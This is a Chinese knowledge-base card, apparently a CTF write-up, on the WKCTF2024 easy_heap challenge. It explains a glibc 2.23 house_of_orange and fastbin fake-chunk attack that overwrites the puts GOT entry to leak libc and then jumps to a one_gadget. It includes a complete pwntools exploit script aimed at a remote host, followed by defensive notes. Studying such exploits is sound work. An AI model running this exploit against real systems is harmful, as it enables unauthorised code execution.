---
id: binary-pwn-heap-house-of-orange-fastbin-got-onegadget
title: WKCTF2024 easy_heap：无 del 用 house_of_orange 将 top chunk 送入 fastbin，edit 溢出改 fd 分配到 fake_chunk，改 puts GOT 泄 libc + one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-orange-fastbin-fake-chunk-got-onegadget
tags:
- pwn
- heap
- house-of-orange
- fastbin
- top-chunk
- got
- one-gadget
- glibc223
- ctf
cve: []
severity: high
confidence: medium
affected_versions: glibc 2.23（题目提供 libc-2.23.so）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V294
  verified_at: '2026-11-08T08:01:17+08:00'
  notes: 已对照原文与13张图核对：图13 add() chunk_number>0x20 退出、size>0x1000 退出；图14 edit() 只查用户自报 nbytes>0x1000、read(0,chunk_ptr[v1],nbytes)，无 index/实际大小校验；exp 的 house_of_orange→fastbin fd→fake_chunk=0x40408d→edit(6) 改指针→recvuntil 0x7f→one_gadget 与原文一致。修正：add 上限表述（0x20 索引可通过）、泄露步骤原 exp 未显式 show 而直接读输出。dup-scan pair#146 与 binary-pwn-heap-metadata-array-offbyone-chunkptr-low-byte-heap-leak 为 related：对方核心是元数据数组 off-by-one，本卡是 house_of_orange+fastbin fake_chunk，非同一链，保留。未复跑 exp。
url: /docs/binary/pwn/heap/binary-pwn-heap-house-of-orange-fastbin-got-onegadget/
draft: false
kb_aliases:
- WKCTF2024 easy_heap
- house_of_orange 无 free
- top chunk 进 fastbin
- edit 溢出 fastbin attack
- puts GOT one_gadget
- fake_chunk 0x40408d
---

## 一句话结论

`easy_heap` 没有 `del`/free，但 `edit` 只检查用户自报 size 的上限（`>0x1000` 才拒绝），既不看目标 chunk 实际大小也不校验 index 与 `chunk_ptr` 数组边界；先 `edit` 溢出把 top chunk 的 size 改成 `0x91`，再 `malloc(0x900)` 触发 `sysmalloc`（house_of_orange）把旧 top 释放进 fastbin；随后用 `edit` 改被释放块的 `fd` 指向固定地址 `fake_chunk=0x40408d`，两次 `malloc(0x68)` 分配到该处；再借 `edit` 把 `chunk_ptr` 中的指针改成 `puts@GOT`，从程序输出泄 `puts` 得 libc，最后把 one_gadget 写到可控的调用位置完成利用。

## 原理

- **没有 free 也能造空闲块**：程序只有 add/edit/show，没有删除；add 在 `chunk_number > 0x20` 时退出（索引 0x20 仍可分配，实际最多 33 块）、size ≤ 0x1000，edit 按 index 找到 `chunk_ptr[v1]` 后用用户自报的 `nbytes[0]` 调 `read(0, chunk_ptr[v1], nbytes[0])`。因此“溢出”是唯一能改相邻块/全局数据的手段。
- **house_of_orange 释放 top chunk**：glibc 2.23 的 top chunk 在堆尾；用越界写把 top chunk 的 `size` 字段改成一个小值（文章为 `0x91`），然后申请一个更大的块（`malloc(0x900)`）。`sysmalloc` 发现旧 top 不满足请求，会把旧 top 从堆上“释放”（进入 unsorted bin/fastbin 体系）并分配新的 top；这样就在没有 `free` 的情况下得到一个可写 `fd` 的空闲块。
- **fastbin 的 raw fd**：glibc 2.23 没有 tcache、也没有 safe-linking，fastbin 空闲块的 `fd` 是原始指针。把该块 `fd` 改成 `fake_chunk`（文章 `0x40408d`，无 PIE 时 BSS 的固定地址），连续两次 `malloc(0x68)`：第一次取回原块，第二次返回 `fake_chunk`，实现在任意固定地址分配。
- **为什么 fake_chunk 是 0x40408d**：该地址处的字节要能通过 `malloc` 的 size 检查（例如 `0x7f` 之类的、落在 fastbin size class 的值），同时位于 BSS 中可控/有意义的全局数据附近；无 PIE 时地址固定，可直接写死。
- **改 GOT 泄 libc**：`edit(6, b'a'*(0x23+0x20)+p64(puts_got))` 越过 chunk 6 的数据写到 `chunk_ptr` 数组中的某个槽，把“某一块的指针”改成 `puts@GOT`；随后程序输出该槽指向的 GOT 内容（原文 exp 在 `edit(6, ...)` 后直接 `recvuntil(b'\x7f')` 读取，未显式调用 `show`），`u64(...[-6:]+b'\x00\x00')` 得到 puts 地址，减 libc 的 puts 符号偏移得 libc 基址。
- **one_gadget 收尾**：文章取 `one_gadget[0] = libcbase + 0x45226`，`edit(0, p64(execve))` 把 one_gadget 写到 chunk 0 对应的可控位置（该位置在 show 路径上会被解引用/调用），再 `show(0)` 触发，得到 shell 后读 flag。
- **为什么能成功**：题目“没开 PIE 和 GOT 保护”（Partial RELRO/无 PIE），`chunk_ptr`/GOT 地址固定；glibc 2.23 的 fastbin 检查宽松、无 safe-linking；edit 的越界写提供了改 top size、fastbin fd、chunk_ptr 的全部能力。

## 触发条件

- 目标为 64 位 Linux，glibc 2.23（无 tcache/safe-linking），题目未开 PIE、GOT 可写（非 Full RELRO）。
- 程序有 add（可分配大块）与 edit（用户自报 size、无实际块大小/边界校验），没有 free。
- `chunk_ptr`/GOT 等关键全局地址固定，且 `fake_chunk`（如 0x40408d）处的 size 字节能通过 malloc 检查。
- 能通过 show 读取 GOT/堆内容，或在 one_gadget 触发点上有可控的函数指针/返回地址。

## 利用步骤

1. 按 exp 先分配布局：`malloc(0x510)`、`malloc(0x510)`、`malloc(0x500)`、`malloc(0x18)`（编号 0–3）。
2. 用 `edit(3, b'\x00'*0x18 + p64(0x91))` 溢出，把 top chunk 的 size 改成 `0x91`。
3. `malloc(0x900)` 触发 `sysmalloc`，旧 top 被释放；此时得到一个 `fd` 可写的 fastbin/空闲块。
4. 用 `edit(3, b'\x00'*0x18 + p64(0x71) + p64(fake_chunk))` 构造 fake chunk header 并把 `fd` 改成 `fake_chunk=0x40408d`。
5. 连续 `malloc(0x68)` 两次：第一次消费原块，第二次返回 `fake_chunk`。
6. 计算 `puts_got = elf.got['puts']`；用 `edit(6, b'a'*(0x23+0x20)+p64(puts_got))` 把 `chunk_ptr` 某槽改成 puts GOT，随后从程序输出 `recvuntil(b'\x7f')` 读取 puts 地址（原文未显式调用 show），`libcbase = leak - libc.symbols['puts']`。
7. 取 one_gadget（如 `libcbase+0x45226`），`edit(0, p64(execve))` 写到 show 路径会解引用/调用的位置，`show(0)` 触发；进入 shell 后读 flag。

## PoC

```python
from pwn import *
FILENAME = './heap'
elf = ELF(FILENAME)
p = remote('110.40.35.73', 33782)
libc = ELF('./libc-2.23.so')

def malloc(size, content=b'a'):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Size', str(size))
    p.sendafter(b'Content', content)

def edit(idx, content):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'Index', str(idx))
    p.sendlineafter(b'Size', str(0x1000))
    p.sendafter(b'Content', content)

def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'Index', str(idx))

malloc(0x510)          # 0
malloc(0x510)          # 1
malloc(0x500)          # 2
malloc(0x18)           # 3

edit(3, b'\x00' * 0x18 + p64(0x91))   # 改 top chunk size
malloc(0x900)          # 4 触发 sysmalloc（house_of_orange）

fake_chunk = 0x40408d
payload = b'\x00' * 0x18 + p64(0x71) + p64(fake_chunk)
edit(3, payload)       # 改 fastbin fd

malloc(0x68)
malloc(0x68)           # 第二次分配到 fake_chunk

puts_got = elf.got['puts']
edit(6, b'a' * (0x23 + 0x20) + p64(puts_got))
leak_add = u64(p.recvuntil(b'\x7f')[-6:] + b'\x00\x00')
libcbase = leak_add - libc.symbols['puts']
print(hex(libcbase))

one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
execve = libcbase + one_gadget[0]
edit(0, p64(execve))
show(0)
p.interactive()
```

## 变体与关联

- **house_of_orange 收尾变体**：经典 FSOP 是改 top size 后构造 `_IO_FILE` 并触发 `_IO_list_all`/`system`；本卡改为把旧 top 送入 fastbin，再用 fastbin attack 分配到固定 fake_chunk，适合无 free 但有 edit 溢出的题。
- **分配目标变体**：fake_chunk 可设在 `__malloc_hook`/`__free_hook`、`chunk_ptr` 数组、GOT 附近；glibc 2.23 无 safe-linking，fd 直接写绝对地址；2.32+ 需按 safe-linking 编码。
- **泄露变体**：改 `chunk_ptr` 指向 GOT/`__libc_start_main` 返回地址；用 show 读；或 unsorted bin 的 fd/bk 泄 libc。
- **收尾变体**：one_gadget、`system('/bin/sh')`、`__free_hook`、FSOP；取决于可控调用点。
- **关联**：[[binary-pwn-heap-house-of-orange-unsortedbin-io-list-all-fsop-system]]（house_of_orange + FSOP）、[[binary-pwn-heap-topchunk-exhaustion-malloc-consolidate-fastbin-unsorted-libc-leak]]（top chunk 耗尽/consolidate）、[[binary-pwn-heap-house-of-roman-fastbin-unsortedbin-malloc-hook-bruteforce]]（fastbin/unsorted 组合打 hook）、[[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]（glibc 2.23 fastbin dup + one_gadget）。
- **边界**：Full RELRO/PIE/glibc 2.32+ safe-linking、edit 有严格边界检查、或 fake_chunk 处 size 不合法时，本链需调整；文章 exp 的 `fake_chunk`/one_gadget 偏移依赖题目二进制与 libc，换题需重新核对。

## 检测与防御

- **代码修复**：edit 必须校验 index 范围和目标 chunk 的实际 size；read 长度不得超过块大小；add 限制总块数与单块大小。
- **编译/运行**：启用 PIE、Full RELRO（GOT 只读）、glibc 升级到 2.32+（safe-linking、tcache key）；堆保护（`MALLOC_CHECK_`/hardened allocator）。
- **检测**：heap 元数据（top size、fastbin fd）被改写；`chunk_ptr` 指向 GOT/非堆地址；show 输出出现 libc 地址；进程执行 `/bin/sh`。
- **说明**：本文为 CTF/授权环境利用，exp 中的固定地址与 libc 偏移依赖题目，不能直接套用到其他程序。
